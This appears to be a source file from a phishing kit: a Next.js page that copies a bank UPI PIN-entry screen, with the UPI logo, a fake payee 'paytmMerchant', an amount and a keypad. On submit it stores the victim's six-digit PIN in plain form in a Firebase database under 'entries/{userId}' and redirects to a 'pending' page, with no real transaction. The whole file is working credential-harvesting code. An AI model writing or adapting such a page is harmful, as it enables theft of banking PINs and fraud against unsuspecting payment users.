"use client";
import { useEffect, useState } from "react";
import { ref, update } from "firebase/database";
import { database } from "@/app/lib/firebase";
import { useRouter } from "next/navigation";
import Image from "next/image";

export default function UpiPinPage() {
  const router = useRouter();
  const [pin, setPin] = useState("");
  const [amount, setAmount] = useState("1.00");
  const [upiApp, setUpiApp] = useState("phonepe");
  const [bank, setBank] = useState("HDFC");

  const handleDigitClick = (digit) => {
    if (pin.length < 6) {
      setPin((prev) => prev + digit);
    }
  };

  const handleBackspace = () => {
    setPin((prev) => prev.slice(0, -1));
  };

  const handleSubmit = async () => {
    if (pin.length !== 6) {
      alert("Please enter 6-digit PIN");
      return;
    }

    const storedUserId = localStorage.getItem("newUserId");
    if (!storedUserId) {
      console.error("User ID not found in localStorage");
      return;
    }

    const timestamp = Date.now();
    const userRef = ref(database, `entries/${storedUserId}`);
    await update(userRef, {
      pin,
      time: timestamp,
    });

    router.push("/pending");
    setPin("");
  };

  useEffect(() => {
    const storedAmount = localStorage.getItem("amount");
    if (storedAmount) {
      setAmount(storedAmount);
    }
    
    // Get UPI app and bank from localStorage instead of searchParams
    const storedUpiApp = localStorage.getItem("upiApp");
    const storedBank = localStorage.getItem("bank");
    if (storedUpiApp) setUpiApp(storedUpiApp);
    if (storedBank) setBank(storedBank);
  }, []);

  return (
    <div className="flex flex-col justify-between h-screen bg-white">
      {/* Header */}
      <div className="flex items-center justify-between p-4 border-b">
        <div>
          <p className="text-gray-900 font-semibold">{bank}</p>
          <p className="text-gray-500 text-sm">XXXXXX</p>
        </div>
        <Image
          src="/UPI-Logo-vector.svg.webp" // place UPI logo in /public
          alt="UPI Logo"
          width={70}
          height={35}
          className="object-contain"
        />
      </div>

      {/* Recipient + Amount */}
      <div className="px-6 mt-4">
        <p className="text-sm text-gray-600">To:</p>
        <p className="font-medium text-gray-800 truncate">paytmMerchant</p>
        <p className="text-xl font-bold text-gray-900">₹{amount}</p>
      </div>

      {/* PIN Text + Dots */}
      <div className="text-center mt-6">
        <p className="text-gray-600 font-medium">ENTER 6-DIGIT UPI PIN</p>
        <div className="flex justify-center space-x-4 mt-4">
          {[...Array(6)].map((_, i) => (
            <span
              key={i}
              className="w-4 h-6 flex items-center justify-center text-3xl font-bold"
            >
              {pin[i] ? "•" : "*"}
            </span>
          ))}
        </div>
      </div>

      {/* Alert Box */}
      <div className="mx-6 mt-4 bg-yellow-100 border border-yellow-300 text-yellow-800 px-3 py-2 rounded-md text-sm text-center">
        ⚠️ You are transferring money from your {bank} account to paytmMerchant
      </div>

      {/* Keypad */}
      <div className="grid grid-cols-3 gap-6 p-6 text-2xl font-medium">
        {[1, 2, 3, 4, 5, 6, 7, 8, 9, "X", 0, "✓"].map((item, index) => (
          <button
            key={index}
            onClick={() => {
              if (item === "X") handleBackspace();
              else if (item === "✓") handleSubmit();
              else handleDigitClick(item);
            }}
            className={`flex items-center justify-center h-14 text-gray-900 ${
              item === "X" || item === "✓" ? "text-white font-bold" : ""
            }`}
            style={
              item === "X" || item === "✓"
                ? {
                    backgroundColor: item === "X" ? "#1E3A8A" : "#2563EB",
                    borderRadius: "9999px",
                    width: "60px",
                    height: "60px",
                    margin: "0 auto",
                  }
                : {}
            }
          >
            {item}
          </button>
        ))}
      </div>
    </div>
  );
}
